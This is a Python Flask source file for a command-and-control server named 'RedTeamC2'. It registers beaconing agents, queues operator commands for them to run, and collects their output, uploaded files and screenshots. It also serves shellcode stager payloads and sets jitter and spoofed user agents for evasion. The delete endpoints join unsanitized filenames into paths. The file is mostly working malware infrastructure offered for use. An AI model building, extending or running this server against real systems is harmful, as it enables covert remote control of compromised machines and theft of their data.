"""
server.py
Flask-SocketIO app entry point for RedTeamC2
"""

from flask import Flask, render_template, request, send_from_directory, jsonify
from flask_socketio import SocketIO, emit
import ssl, os, sys, base64, uuid, time, logging
from werkzeug.utils import secure_filename

app = Flask(__name__, template_folder='templates')
socketio = SocketIO(app)

# In-memory storage
agents = {}
tasks = {}
results = {}

UPLOAD_FOLDER = '../c2server/uploads'
SCREENSHOT_FOLDER = '../c2server/screenshots'
STAGER_PAYLOAD = b''  # Set this to your shellcode as needed
STAGER_PAYLOADS = {}
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(SCREENSHOT_FOLDER, exist_ok=True)

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')

@app.route('/')
def index():
    try:
        return render_template('index.html', agents=agents)
    except Exception as e:
        logging.error(f"Template error: {e}")
        return f'<h1>Template Error</h1><p>{e}</p>', 500

@app.route('/api/beacon', methods=['POST'])
def beacon():
    try:
        data = request.get_data()
        agent_id = request.headers.get('X-Agent-ID') or str(uuid.uuid4())
        sysinfo = base64.b64decode(data).decode(errors='ignore')
        agents[agent_id] = {'id': agent_id, 'sysinfo': sysinfo, 'last_seen': time.time()}
        socketio.emit('agent_update', {'agents': list(agents.values())})
        # Get next task for this agent
        task = tasks.pop(agent_id, None)
        if task:
            return base64.b64encode(task.encode()).decode()
        return base64.b64encode(b'').decode()
    except Exception as e:
        logging.error(f"Beacon error: {e}")
        return '', 500

@app.route('/api/result', methods=['POST'])
def result():
    try:
        agent_id = request.headers.get('X-Agent-ID')
        data = request.get_data()
        output = base64.b64decode(data).decode(errors='ignore')
        if agent_id:
            results.setdefault(agent_id, []).append(output)
            socketio.emit('result_update', {'agent_id': agent_id, 'result': output})
        return 'OK'
    except Exception as e:
        logging.error(f"Result error: {e}")
        return 'Error', 500

@app.route('/api/task', methods=['POST'])
def task():
    try:
        agent_id = request.form.get('agent_id')
        cmd = request.form.get('cmd')
        if not agent_id or not cmd:
            return jsonify({'error': 'Missing agent_id or cmd'}), 400
        tasks[agent_id] = cmd
        logging.info(f"Queued task for {agent_id}: {cmd}")
        return 'Task queued'
    except Exception as e:
        logging.error(f"Task error: {e}")
        return 'Error', 500

@app.route('/api/upload', methods=['POST'])
def upload():
    try:
        agent_id = request.form.get('agent_id')
        file = request.files.get('file')
        if not file or not file.filename:
            return 'No file uploaded', 400
        filename = secure_filename(file.filename)
        file.save(os.path.join(UPLOAD_FOLDER, filename))
        logging.info(f"Agent {agent_id} uploaded file: {filename}")
        return 'File uploaded'
    except Exception as e:
        logging.error(f"Upload error: {e}")
        return 'Error', 500

@app.route('/api/screenshot', methods=['POST'])
def screenshot():
    try:
        agent_id = request.form.get('agent_id')
        file = request.files.get('screenshot')
        if not file or not file.filename:
            return 'No screenshot uploaded', 400
        filename = secure_filename(file.filename)
        file.save(os.path.join(SCREENSHOT_FOLDER, filename))
        logging.info(f"Agent {agent_id} uploaded screenshot: {filename}")
        return 'Screenshot uploaded'
    except Exception as e:
        logging.error(f"Screenshot error: {e}")
        return 'Error', 500

@app.route('/uploads/<filename>')
def get_upload(filename):
    try:
        return send_from_directory(UPLOAD_FOLDER, filename)
    except Exception as e:
        logging.error(f"Get upload error: {e}")
        return 'Error', 404

@app.route('/screenshots/<filename>')
def get_screenshot(filename):
    try:
        return send_from_directory(SCREENSHOT_FOLDER, filename)
    except Exception as e:
        logging.error(f"Get screenshot error: {e}")
        return 'Error', 404

@app.route('/api/files')
def api_files():
    try:
        files = [f for f in os.listdir(UPLOAD_FOLDER) if os.path.isfile(os.path.join(UPLOAD_FOLDER, f))]
        return jsonify(files)
    except Exception as e:
        logging.error(f"Files error: {e}")
        return jsonify([])

@app.route('/api/screenshots')
def api_screenshots():
    try:
        shots = [f for f in os.listdir(SCREENSHOT_FOLDER) if os.path.isfile(os.path.join(SCREENSHOT_FOLDER, f))]
        return jsonify(shots)
    except Exception as e:
        logging.error(f"Screenshots error: {e}")
        return jsonify([])

@app.route('/api/upload_file', methods=['POST'])
def upload_file():
    try:
        file = request.files.get('file')
        if not file or not file.filename:
            return jsonify({'error': 'No file uploaded'}), 400
        filename = secure_filename(file.filename)
        file.save(os.path.join(UPLOAD_FOLDER, filename))
        logging.info(f"Operator uploaded file: {filename}")
        return jsonify({'success': True, 'filename': filename})
    except Exception as e:
        logging.error(f"Upload file error: {e}")
        return jsonify({'error': 'Upload failed'}), 500

@app.route('/api/delete_file', methods=['POST'])
def delete_file():
    try:
        data = request.get_json(silent=True) or {}
        filename = data.get('filename')
        if not filename:
            return jsonify({'error': 'No filename provided'}), 400
        path = os.path.join(UPLOAD_FOLDER, filename)
        if os.path.exists(path):
            os.remove(path)
            logging.info(f"Deleted file: {filename}")
            return jsonify({'success': True})
        return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        logging.error(f"Delete file error: {e}")
        return jsonify({'error': 'Delete failed'}), 500

@app.route('/api/delete_screenshot', methods=['POST'])
def delete_screenshot():
    try:
        data = request.get_json(silent=True) or {}
        filename = data.get('filename')
        if not filename:
            return jsonify({'error': 'No filename provided'}), 400
        path = os.path.join(SCREENSHOT_FOLDER, filename)
        if os.path.exists(path):
            os.remove(path)
            logging.info(f"Deleted screenshot: {filename}")
            return jsonify({'success': True})
        return jsonify({'error': 'Screenshot not found'}), 404
    except Exception as e:
        logging.error(f"Delete screenshot error: {e}")
        return jsonify({'error': 'Delete failed'}), 500

@app.route('/api/stager_upload', methods=['POST'])
def stager_upload():
    try:
        file = request.files.get('payload')
        if not file or not file.filename:
            return jsonify({'error': 'No payload uploaded'}), 400
        name = secure_filename(file.filename)
        STAGER_PAYLOADS[name] = file.read()
        logging.info(f"Uploaded stager payload: {name}")
        return jsonify({'success': True, 'name': name})
    except Exception as e:
        logging.error(f"Stager upload error: {e}")
        return jsonify({'error': 'Stager upload failed'}), 500

@app.route('/api/stager_list')
def stager_list():
    try:
        return jsonify(list(STAGER_PAYLOADS.keys()))
    except Exception as e:
        logging.error(f"Stager list error: {e}")
        return jsonify([])

@app.route('/api/stager_delete', methods=['POST'])
def stager_delete():
    try:
        data = request.get_json(silent=True) or {}
        name = data.get('name')
        if name in STAGER_PAYLOADS:
            del STAGER_PAYLOADS[name]
            logging.info(f"Deleted stager payload: {name}")
            return jsonify({'success': True})
        return jsonify({'error': 'Payload not found'}), 404
    except Exception as e:
        logging.error(f"Stager delete error: {e}")
        return jsonify({'error': 'Delete failed'}), 500

@app.route('/api/stager', methods=['GET'])
def get_stager():
    try:
        name = request.args.get('name')
        if name and name in STAGER_PAYLOADS:
            return base64.b64encode(STAGER_PAYLOADS[name])
        # fallback to default
        return base64.b64encode(STAGER_PAYLOAD)
    except Exception as e:
        logging.error(f"Get stager error: {e}")
        return '', 500

settings = {'jitter_min': 10, 'jitter_max': 30, 'user_agents': [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64)",
    "curl/7.55.1"
]}

@app.route('/api/settings', methods=['GET', 'POST'])
def api_settings():
    global settings
    try:
        if request.method == 'POST':
            data = request.get_json(silent=True) or {}
            if not isinstance(data, dict):
                return jsonify({'error': 'Invalid settings data'}), 400
            settings.update(data)
            logging.info(f"Settings updated: {settings}")
            return jsonify(settings)
        return jsonify(settings)
    except Exception as e:
        logging.error(f"Settings error: {e}")
        return jsonify({'error': 'Settings error'}), 500

@app.route('/api/agents')
def api_agents():
    try:
        return jsonify(list(agents.values()))
    except Exception as e:
        logging.error(f"Agents error: {e}")
        return jsonify([])

@app.route('/api/results/<agent_id>')
def api_results(agent_id):
    try:
        return jsonify(results.get(agent_id, []))
    except Exception as e:
        logging.error(f"Results error: {e}")
        return jsonify([])

# SOCKS handler stub
@app.route('/api/socks', methods=['POST'])
def socks():
    return 'SOCKS handler not implemented yet'

if __name__ == '__main__':
    cert_path = '../certs/c2.crt'
    key_path = '../certs/c2.key'
    if os.path.exists(cert_path) and os.path.exists(key_path):
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(cert_path, key_path)
            print(f"[*] Using SSL certs: {cert_path}, {key_path}")
            socketio.run(app, host='0.0.0.0', port=5000, ssl_context=context)
        except Exception as e:
            print(f"[!] SSL error: {e}\nRun this command to generate certs if needed:")
            print("openssl req -x509 -newkey rsa:4096 -keyout certs/c2.key -out certs/c2.crt -days 365 -nodes -subj '/CN=localhost'")
            sys.exit(1)
    else:
        print("[!] SSL certs not found. Running without SSL on http://localhost:5000 (not secure)")
        socketio.run(app, host='0.0.0.0', port=5000)
